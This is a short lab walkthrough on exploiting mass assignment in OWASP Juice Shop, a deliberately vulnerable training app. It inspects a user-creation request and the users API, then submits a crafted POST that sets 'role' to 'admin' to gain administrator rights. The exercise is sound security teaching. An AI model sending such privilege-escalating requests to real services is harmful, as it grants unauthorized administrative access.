# Mass Assignment

Mass assignment occurs when a property of a JSON or request payload is available in an unintended security context.

1. Review the network traffic generated after creating a user in the OWASP juice shop and note the following request:

    ``` json
    POST https://localhost:88/api/Users/ HTTP/1.1
    {
        "email" : "someone@somewhere.com",
        "password" : "BadPass123",
        "passwordRepeat" : "BadPass123",
        "securityQuestion" : {
            "id" : 7,
            "question" : "Name of your favorite pet?",
            "createdAt" : "2024-03-24T13:50:54.019Z",
            "updatedAt" : "2024-03-24T13:50:54.019Z"
            },
        "securityAnswer" : "Bob"
    }
    ```

1. After logging in, submit a GET request to `api\Users` and observe the response:

    ``` json
    {
    "status" : "success",
    "data" : [ {
        "id" : 1,
        "username" : "",
        "email" : "admin@juice-sh.op",
        "role" : "admin",
        "deluxeToken" : "",
        "lastLoginIp" : "",
        "profileImage" : "assets/public/images/uploads/defaultAdmin.png",
        "isActive" : true,
        "createdAt" : "2024-03-24T18:39:35.837Z",
        "updatedAt" : "2024-03-24T18:39:35.837Z",
        "deletedAt" : null
    },
    . . .
    ```

1. Note that the `role` is returned. Attempt to create a new user with the following request:

    ``` json
    POST https://localhost:88/api/Users/ HTTP/1.1
    {
        "email" : "sneakyadmin",
        "password" : "admin",
        "role" : "admin"
    }
    ```